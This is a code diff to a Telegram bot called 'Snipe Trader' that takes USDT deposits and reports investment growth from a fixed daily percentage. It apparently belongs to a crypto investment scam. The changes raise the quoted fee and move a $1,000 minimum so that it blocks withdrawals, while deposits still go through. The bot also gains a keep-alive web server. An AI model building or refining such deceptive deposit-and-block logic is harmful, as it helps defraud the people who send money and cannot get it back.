@@ -1,5 +1,15 @@
+import http from "http";
 import { DAILY_PERCENTAGE_GROWTH, telegramBot } from "./config";
 import { calculateDays, calculateInvestmentGrowth, calculatePercentageGrowth, createUser, findUserByInviteCode, formatAmount, getRandomItem, getUser, hasActiveBot, hasFunds, hasWallet, updateUser } from "./utils";
+
+const PORT = 3000;
+
+http.createServer((_req, res) => {
+  res.writeHead(200, { "Content-Type": "text/plain" });
+  res.end("Snipe Trader is running");
+}).listen(PORT, () => {
+  console.log(`Listening on port ${PORT}`);
+});
 
 // Start command
 telegramBot.onText(/\/start/, async (msg) => {
@@ -51,7 +61,7 @@ telegramBot.onText(/\/deposit/, async (msg) => {
 
     await telegramBot.sendMessage(msg.chat.id, "To start automated trading, transfer USDT using TRC-20 network from any exchange directly to your wallet address:");
     await telegramBot.sendMessage(msg.chat.id, user.walletAddress);
-    await telegramBot.sendMessage(msg.chat.id, "Your balance will update automatically once the funds are received. Note that deposits are free, we apply a 15% performance fee to profits only.");
+    await telegramBot.sendMessage(msg.chat.id, "Your balance will update automatically once the funds are received. Note that deposits are free, we apply a 20% performance fee to profits only.");
 });
 
 // Wallet command
@@ -121,6 +131,11 @@ telegramBot.onText(/\/withdraw (\d+)/, async (msg, match) => {
         return;
     }
 
+    if(user.funds < 1000){
+        await telegramBot.sendMessage(msg.chat.id, "Since we deduct a 20% fee on profits only, our automated trading assistant requires a minimum profit of $1,000 to withdraw any funds. To add funds to your wallet, use the /deposit command.");
+        return;
+    }
+
     await telegramBot.sendMessage(msg.chat.id, "Please provide your USDT withdrawal address using TRC-20 network. Ensure the address is correct to avoid any issues with the transaction.");
 });
 
@@ -144,11 +159,6 @@ telegramBot.onText(/\/run/, async (msg) => {
 
     if (!hasFunds(msg.chat.id)) {
         await telegramBot.sendMessage(msg.chat.id, "No funds are currently available in your wallet. Use the /deposit command to add funds to it.");
-        return;
-    }
-
-    if(user.funds < 1000){
-        await telegramBot.sendMessage(msg.chat.id, "Since we deduct a 15% fee on profits only, our automated trading assistant requires a minimum balance of $1,000. To add funds to your wallet, use the /deposit command.");
         return;
     }
 
